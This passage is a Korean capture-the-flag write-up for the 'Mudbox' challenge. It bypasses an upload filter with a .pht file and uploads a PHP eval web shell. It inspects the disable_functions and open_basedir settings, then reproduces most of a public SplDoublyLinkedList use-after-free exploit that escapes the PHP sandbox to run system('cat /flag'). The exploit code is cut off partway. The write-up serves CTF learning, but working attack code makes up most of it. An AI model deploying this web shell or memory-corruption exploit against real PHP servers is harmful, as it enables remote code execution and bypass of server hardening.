<p>문제에서는 위와 같이 파일 업로드 기능을 제공하고 있고, php, phar, htm이 들어간 확장자는 모두 필터링에 걸리는데, pht 확장자를 이용해서 우회할 수 있습니다.</p>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/2.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/2.png?raw=true" alt="" loading="lazy"></a></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]);</span>
    <span class="nb">show_source</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>그래서 일단 위 페이로드를 pht 확장자로 업로드 해주었습니다.</p>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/3.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/3.png?raw=true" alt="" loading="lazy"></a></p>

<p>업로드한 파일을 읽어 보니 php로 잘 인식하는 것을 확인 할 수 있습니다.</p>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/rce.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/rce.png?raw=true" alt="" loading="lazy"></a></p>

<p>code 값으로 <code class="language-plaintext highlighter-rouge">phpinfo();</code>를 넘겨ㅡ주니 실행 또한 잘 되는 것을 확인 할 수 있습니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,getenv,putenv
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">phpinfo();</code>에서 disable_functions 설정을 확인 해보니 위와 같이 여러 함수들이 비활성화 되어 있는 것을 확인 할 수 있습니다.</p>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-12%20%EC%98%A4%ED%9B%84%205.45.14.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-09-12%20%EC%98%A4%ED%9B%84%205.45.14.png?raw=true" alt="" loading="lazy"></a></p>

<p>그리고 혹시나 해서 <code class="language-plaintext highlighter-rouge">open_basedir</code> 설정도 확인 해보니 위와 같이 <code class="language-plaintext highlighter-rouge">/tmp:/var/www/html/data</code> 설정 되어 있는 것을 확인 했습니다. 플래그는 현재 <code class="language-plaintext highlighter-rouge">/flag</code>에 있습니다. 또한 우리가 업로드 하는 웹쉘도 <code class="language-plaintext highlighter-rouge">data/</code> 하위에 생성이 되기 때문에 <code class="language-plaintext highlighter-rouge">data/</code> 디렉터리에서 현재 경로 및 하위 파일들만 건들 수 있습니다.</p>

<p>그래서 open_basedir을 우회해서 최상위 디렉터리에 있는 <code class="language-plaintext highlighter-rouge">/flag</code>를 읽어야 합니다.</p>

<p>open_basedir을 우회하는 첫 번째 방식은 잘 알려진 UAF Sandbox Escape를 이용하는 것 입니다.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="c1">#
# PHP SplDoublyLinkedList::offsetUnset UAF</span>
<span class="c1"># Charles Fol (@cfreal_)</span>
<span class="c1"># 2020-08-07</span>
<span class="c1"># PHP is vulnerable from 5.3 to 8.0 alpha</span>
<span class="c1"># This exploit only targets PHP7+.</span>
<span class="c1">#
# SplDoublyLinkedList is a doubly-linked list (DLL) which supports iteration.</span>
<span class="c1"># Said iteration is done by keeping a pointer to the "current" DLL element.</span>
<span class="c1"># You can then call next() or prev() to make the DLL point to another element.</span>
<span class="c1"># When you delete an element of the DLL, PHP will remove the element from the</span>
<span class="c1"># DLL, then destroy the zval, and finally clear the current ptr if it points</span>
<span class="c1"># to the element. Therefore, when the zval is destroyed, current is still</span>
<span class="c1"># pointing to the associated element, even if it was removed from the list.</span>
<span class="c1"># This allows for an easy UAF, because you can call $dll-&gt;next() or</span>
<span class="c1"># $dll-&gt;prev() in the zval's destructor.</span>
<span class="c1">#
#</span>


<span class="nb">define</span><span class="p">(</span><span class="s1">'NB_DANGLING'</span><span class="p">,</span> <span class="mi">200</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'SIZE_ELEM_STR'</span><span class="p">,</span> <span class="mi">40</span> <span class="o">-</span> <span class="mi">24</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'STR_MARKER'</span><span class="p">,</span> <span class="mh">0xcf5ea1</span><span class="p">);</span>

<span class="k">function</span> <span class="n">i2s</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="nv">$x</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="nv">$x</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$s</span><span class="p">[</span><span class="nv">$p</span><span class="o">+</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
        <span class="nv">$i</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="k">function</span> <span class="n">s2i</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$x</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="nv">$x</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$j</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">--</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$i</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="nv">$i</span> <span class="o">|=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="nv">$p</span><span class="o">+</span><span class="nv">$j</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$i</span><span class="p">;</span>
<span class="p">}</span>


<span class="kd">class</span> <span class="nc">UAFTrigger</span>
<span class="p">{</span>
    <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$dlls</span><span class="p">,</span> <span class="nv">$strs</span><span class="p">,</span> <span class="nv">$rw_dll</span><span class="p">,</span> <span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">;</span>

        <span class="c1">#"print('UAF __destruct: ' . "\n");</span>
        <span class="nv">$dlls</span><span class="p">[</span><span class="no">NB_DANGLING</span><span class="p">]</span><span class="o">-&gt;</span><span class="nf">offsetUnset</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

        <span class="c1"># At this point every $dll-&gt;current points to the same freed chunk. We allocate</span>
        <span class="c1"># that chunk with a string, and fill the zval part</span>
        <span class="nv">$fake_dll_element</span> <span class="o">=</span> <span class="nb">str_shuffle</span><span class="p">(</span><span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="no">SIZE_ELEM_STR</span><span class="p">));</span>
        <span class="nf">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x12345678</span><span class="p">);</span> <span class="c1"># ptr</span>
        <span class="nf">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x00000004</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span> <span class="c1"># type + other stuff</span>

        <span class="c1"># Each of these dlls current-&gt;next pointers point to the same location,</span>
        <span class="c1"># the string we allocated. When calling next(), our fake element becomes</span>
        <span class="c1"># the current value, and as such its rc is incremented. Since rc is at</span>
        <span class="c1"># the same place as zend_string.len, the length of the string gets bigger,</span>
        <span class="c1"># allowing to R/W any part of the following memory</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="no">NB_DANGLING</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
            <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">-&gt;</span><span class="nb">next</span><span class="p">();</span>

        <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="no">SIZE_ELEM_STR</span><span class="p">)</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'Exploit failed: fake_dll_element did not increase in size'</span><span class="p">);</span>

        <span class="nv">$leaked_str_offsets</span> <span class="o">=</span> <span class="p">[];</span>
        <span class="nv">$leaked_str_zval</span> <span class="o">=</span> <span class="p">[];</span>

        <span class="c1"># In the memory after our fake element, that we can now read and write,</span>
        <span class="c1"># there are lots of zend_string chunks that we allocated. We keep three,</span>
        <span class="c1"># and we keep track of their offsets.</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$offset</span> <span class="o">=</span> <span class="no">SIZE_ELEM_STR</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$offset</span> <span class="o">&lt;=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">)</span> <span class="o">-</span> <span class="mi">40</span><span class="p">;</span> <span class="nv">$offset</span> <span class="o">+=</span> <span class="mi">40</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1"># If we find a string marker, pull it from the string list</span>
            <span class="k">if</span><span class="p">(</span><span class="nf">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$offset</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">==</span> <span class="no">STR_MARKER</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nv">$leaked_str_offsets</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$offset</span><span class="p">;</span>
                <span class="nv">$leaked_str_zval</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$strs</span><span class="p">[</span><span class="nf">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$offset</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)];</span>
                <span class="k">if</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$leaked_str_zval</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$leaked_str_zval</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'Exploit failed: unable to leak three zend_strings'</span><span class="p">);</span>

        <span class="c1"># free the strings, except the three we need</span>
        <span class="nv">$strs</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>

        <span class="c1"># Leak adress of first chunk</span>
        <span class="k">unset</span><span class="p">(</span><span class="nv">$leaked_str_zval</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="k">unset</span><span class="p">(</span><span class="nv">$leaked_str_zval</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="k">unset</span><span class="p">(</span><span class="nv">$leaked_str_zval</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
        <span class="nv">$first_chunk_addr</span> <span class="o">=</span> <span class="nf">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

        <span class="c1"># At this point we have 3 freed chunks of size 40, which we can read/write,</span>
        <span class="c1"># and we know their address.</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'Address of first RW chunk: 0x'</span> <span class="mf">.</span> <span class="nb">dechex</span><span class="p">(</span><span class="nv">$first_chunk_addr</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>

        <span class="c1"># In the third one, we will allocate a DLL element which points to a zend_array</span>
        <span class="nv">$rw_dll</span><span class="o">-&gt;</span><span class="nf">push</span><span class="p">([</span><span class="mi">3</span><span class="p">]);</span>
        <span class="nv">$array_addr</span> <span class="o">=</span> <span class="nf">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
        <span class="c1"># Change the zval type from zend_object to zend_string</span>
        <span class="nf">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00000006</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">gettype</span><span class="p">(</span><span class="nv">$rw_dll</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">!=</span> <span class="s1">'string'</span><span class="p">)</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'Exploit failed: Unable to change zend_array to zend_string'</span><span class="p">);</span>

        <span class="c1"># We can now read anything: if we want to read 0x11223300, we make zend_string*</span>
        <span class="c1"># point to 0x11223300-0x10, and read its size using strlen()</span>

        <span class="c1"># Read zend_array-&gt;pDestructor</span>
        <span class="nv">$zval_ptr_dtor_addr</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$array_addr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">);</span>

        <span class="k">print</span><span class="p">(</span><span class="s1">'Leaked zval_ptr_dtor address: 0x'</span> <span class="mf">.</span> <span class="nb">dechex</span><span class="p">(</span><span class="nv">$zval_ptr_dtor_addr</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>

        <span class="c1"># Use it to find zif_system</span>
        <span class="nv">$system_addr</span> <span class="o">=</span> <span class="nf">get_system_address</span><span class="p">(</span><span class="nv">$zval_ptr_dtor_addr</span><span class="p">);</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'Got PHP_FUNCTION(system): 0x'</span> <span class="mf">.</span> <span class="nb">dechex</span><span class="p">(</span><span class="nv">$system_addr</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>

        <span class="c1"># In the second freed block, we create a closure and copy the zend_closure struct</span>
        <span class="c1"># to a string</span>
        <span class="nv">$rw_dll</span><span class="o">-&gt;</span><span class="nf">push</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nv">$x</span><span class="p">)</span> <span class="p">{});</span>
        <span class="nv">$closure_addr</span> <span class="o">=</span> <span class="nf">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">str_shuffle</span><span class="p">(</span><span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">));</span>

        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x138</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nf">i2s</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$closure_addr</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="c1"># Change internal func type and pointer to make the closure execute system instead</span>
        <span class="nf">i2s</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
        <span class="nf">i2s</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$system_addr</span><span class="p">);</span>

        <span class="c1"># Push our string, which contains a fake zend_closure, in the last freed chunk that</span>
        <span class="c1"># we control, and make the second zval point to it.</span>
        <span class="nv">$rw_dll</span><span class="o">-&gt;</span><span class="nf">push</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
        <span class="nv">$fake_zend_closure</span> <span class="o">=</span> <span class="nf">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24</span><span class="p">;</span>
        <span class="nf">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="nv">$fake_zend_closure</span><span class="p">);</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'Replaced zend_closure by the fake one: 0x'</span> <span class="mf">.</span> <span class="nb">dechex</span><span class="p">(</span><span class="nv">$fake_zend_closure</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>

        <span class="c1"># Calling it now</span>

        <span class="k">print</span><span class="p">(</span><span class="s1">'Running system("cat /flag");'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
        <span class="nv">$rw_dll</span><span class="p">[</span><span class="mi">1</span><span class="p">](</span><span class="s1">'cat /flag'</span><span class="p">);</span>

        <span class="nb">print_r</span><span class="p">(</span><span class="s1">'DONE'</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">DanglingTrigger</span>
<span class="p">{</span>
    <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$i</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">i</span> <span class="o">=</span> <span class="nv">$i</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$dlls</span><span class="p">;</span>
        <span class="c1">#D print('__destruct: ' . $this-&gt;i . "\n");</span>
        <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="nf">offsetUnset</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="nf">push</span><span class="p">(</span><span class="mi">123</span><span class="p">);</span>
        <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="nf">offsetUnset</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">SystemExecutor</span> <span class="kd">extends</span> <span class="nc">ArrayObject</span>
<span class="p">{</span>
    <span class="k">function</span> <span class="n">offsetGet</span><span class="p">(</span><span class="nv">$x</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">parent</span><span class="o">::</span><span class="nf">offsetGet</span><span class="p">(</span><span class="nv">$x</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cd">/**
 * Reads an arbitrary address by changing a zval to point to the address minus 0x10,
 * and setting its type to zend_string, so that zend_string-&gt;len points to the value
 * we want to read.
 */</span>
<span class="k">function</span> <span class="n">read</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="nv">$s</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">global</span> <span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">,</span> <span class="nv">$rw_dll</span><span class="p">;</span>

    <span class="nf">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="nv">$addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="nf">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00000006</span><span class="p">);</span>

    <span class="nv">$value</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$rw_dll</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>

    <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span>
        <span class="nv">$value</span> <span class="o">&amp;=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="nv">$s</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$start</span> <span class="o">=</span> <span class="nv">$binary_leak</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$start</span> <span class="o">-</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nv">$i</span><span class="p">;</span>
        <span class="nv">$leak</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
        <span class="c1"># ELF header</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">==</span> <span class="mh">0x10102464c457f</span><span class="p">)</span>
            <span class="k">return</span> <span class="nv">$addr</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1"># We'll crash before this but it's clearer this way</span>
    <span class="k">die</span><span class="p">(</span><span class="s1">'Exploit failed: Unable to find ELF header'</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$e_type</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$base</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

    <span class="nv">$e_phoff</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$base</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span>
    <span class="nv">$e_phentsize</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$base</span> <span class="o">+</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="nv">$e_phnum</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$base</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$e_phnum</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$header</span> <span class="o">=</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$e_phoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_phentsize</span><span class="p">;</span>
        <span class="nv">$p_type</span>  <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$header</span> <span class="o">+</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
        <span class="nv">$p_flags</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$header</span> <span class="o">+</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
